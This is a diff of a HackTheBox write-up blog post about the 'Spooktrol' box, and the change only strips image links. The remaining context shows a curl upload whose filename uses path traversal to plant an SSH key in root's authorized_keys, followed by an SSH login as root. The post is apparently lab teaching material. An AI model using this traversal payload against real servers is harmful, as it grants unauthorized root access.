@@ -4,8 +4,6 @@ date: 2026-11-11 07:00:00 -0500
 categories: [HackTheBox, Linux]
 tags: [hackthebox, linux, hard, c2, file-upload, path-traversal, ssh, api]
 description: "Spooktrol is a Hard Linux box built around a homemade malware command-and-control server. Its file-upload API trusts the client-supplied filename, so a directory-traversal path writes our SSH public key straight into the container root's authorized_keys — SSH on the internal port 2222 then lands the user flag. This post covers recon through user.txt."
-image:
-    path: /assets/Images/spooktrol-002_exploit_traversal-upload.png
 ---
 
 ## Overview
@@ -37,7 +35,6 @@ curl -s http://10.129.96.46/robots.txt
 # Disallow: /file_management/?file=implant
 ```
 
-![auth token](/assets/Images/spooktrol-001_recon_auth-token.png)
 
 Fuzzing the API surfaces the routes that matter: `/file_management/`, `/poll`, `/result`, and `/file_upload/`. The `/file_management/?file=implant` route serves the compiled C2 implant (a static ELF), and `/file_upload/` is the endpoint the implant uses to push files back to the server. That upload endpoint is where the filename is trusted.
 
@@ -55,7 +52,6 @@ curl -s -X PUT http://10.129.96.46/file_upload/ -H "Host: spooktrol.htb" -b "aut
 # {"message":"File upload successful /file_management/?file=../../../../../../root/.ssh/authorized_keys"}
 ```
 
-![traversal upload](/assets/Images/spooktrol-002_exploit_traversal-upload.png)
 
 Now SSH in as root — on **port 2222**, the container's SSH, not the host's on 22:
 
@@ -65,7 +61,6 @@ ssh -i spook -p 2222 root@10.129.96.46
 # uid=0(root)  hostname: spook2  (/.dockerenv present)
 ```
 
-![user flag](/assets/Images/spooktrol-003_foothold_user-flag.png)
 
 ## User flag
 
